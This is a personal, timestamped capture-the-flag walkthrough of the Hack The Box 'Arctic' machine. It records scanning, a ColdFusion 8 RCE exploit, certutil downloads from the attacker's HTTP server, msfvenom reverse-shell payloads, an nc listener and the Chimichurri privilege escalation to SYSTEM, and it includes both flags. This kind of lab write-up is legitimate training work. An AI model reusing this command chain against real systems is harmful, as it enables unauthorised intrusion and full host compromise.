```
Arctic HTB - fresh attempt 2

lessons learned:
- cold fusion exploit
- winpeasany.bat
```

```
1:17 PM 1/22/2023
──(root㉿kali)-[/home/kali/Documents/transfer]
└─# nmap -sC -sV  10.10.10.11
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-22 18:16 EST
Nmap scan report for 10.10.10.11
Host is up (0.16s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?															# fmtp
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 165.67 seconds
```

```
1:21 PM 1/22/2023
http://10.10.10.11:8500/							#browsing file transfer page./								
http://10.10.10.11:8500/CFIDE/administrator/		# shows adobe COldfusion 8 LOGIN PAGE
```

```
1:23 PM 1/22/2023
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# searchsploit coldfusion 8


Adobe ColdFusion 8 - Remote Command Execution (RCE)                                | cfm/webapps/50057.py
ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                  | cfm/webapps/16788.rb
```

```
1:24 PM 1/22/2023
going to look into and try Adobe ColdFusion 8 - Remote Command Execution (RCE)  1st


							if __name__ == '__main__':				# the only parameteres that i changed.
								# Define some information
								lhost = '10.10.16.11'
								lport = 4444
								rhost = "10.10.10.11"
								rport = 8500
								filename = uuid.uuid4().hex
```

```								
1:35 PM 1/22/2023
C:\ColdFusion8\runtime\bin>whoami								# on box.
whoami
arctic\tolis
```

```
1:37 PM 1/22/2023
C:\Users\tolis\Desktop>type user.txt																
# user flag.
type user.txt
51f60624c7cdad39da78385069849966
```

```
1:37 PM 1/22/2023
┌──(root㉿kali)-[/home/kali/Documents/transfer]														# hosting server to put winpeasany onto box.
└─# python3 -m http.server                             
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
1:38 PM 1/22/2023
certutil -urlcache -f http://10.10.16.11:8000/winPEASany.exe winpeas.exe	


    windows/shell_reverse_tcp                                          Connect back to attacker and spawn a command shell
                                                                                                                     
┌──(root㉿kali)-[/home/kali/Documents/transfer]															# made payload and xferred payload,
└─# msfvenom -l payloads | grep windows/shell_reverse_tcp
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.11 LPORT=5555 -f exe > prompt.exe
```

```
1:51 PM 1/22/2023
certutil -urlcache -f http://10.10.16.11:8000/prompt.exe prompt.exe												# didnt work trying different syntax payload.



C:\Users\tolis\Desktop>            

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.11 LPORT=5555 -f exe > prompt.exe							# shell_ instead of shell/, xferring back over
```

```
1:58 PM 1/22/2023																								# on box with new reverse shell but still cant execute winpeas.
C:\Users\tolis\Desktop>
```

```
1:59 PM 1/22/2023																															# trying this shell, maybe x64 issue?
   windows/x64/shell_reverse_tcp                                      Connect back to attacker and spawn a command shell (Windows x64)
                                                                                                                     
```

```
2:00 PM 1/22/2023
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.11 LPORT=5555 -f exe > prompt.exe	
```

```
2:01 PM 1/22/2023
certutil -urlcache -f http://10.10.16.11:8000/prompt.exe prompt.exe										# putting 3rd new shell onto box.
```

```
2:09 PM 1/22/2023
C:\Users\tolis\Desktop>whoami /priv
whoami /priv
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 	
```

```
2:16 PM 1/22/2023															
certutil -urlcache -f http://10.10.16.11:8000/winPEASany.exe winPEASany.exe

certutil -urlcache -f http://10.10.16.11:8000/winPEAS.bat winPEAS.bat											# this one executed finally


	MS10-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)								
	# chimichurri exploit available.
```

```
2:48 PM 1/22/2023																			

root㉿kali)-[/home/kali/Documents/transfer]									# nc listener for chimichurri
└─# nc -lvnp 1212
listening on [any] 1212 ...
```

```
2:50 PM 1/22/2023
certutil -urlcache -f http://10.10.16.11:8000/Chimichurri.exe Chimichurri.exe	# threw up chimichurri
```

```
2:50 PM 1/22/2023
Chimichurri.exe 10.10.16.11 1212
```

```
2:51 PM 1/22/2023																# successful
└─# nc -lvnp 1212
listening on [any] 1212 ...
connect to [10.10.16.11] from (UNKNOWN) [10.10.10.11] 49596
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
nt authority\system
```

```
2:52 PM 1/22/2023
C:\Users\Administrator\Desktop>type root.txt
type root.txt
bce794530705d2fdf51bb88ecbd09abe
```


